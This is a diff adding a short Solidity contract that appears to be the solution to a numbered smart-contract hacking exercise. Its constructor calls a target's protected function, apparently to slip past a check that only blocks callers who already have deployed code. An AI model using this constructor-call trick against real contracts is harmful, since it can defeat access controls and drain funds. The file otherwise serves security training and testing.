@@ -1,0 +1,13 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.17;
+
+import './Question0018Ext.sol';
+
+contract Question0018Solution {
+    Target public target;
+    // Please complete this hack contract with calling Target.protected.
+    constructor(address _target) {
+        // This will work
+        Target(_target).protected();
+    }
+}
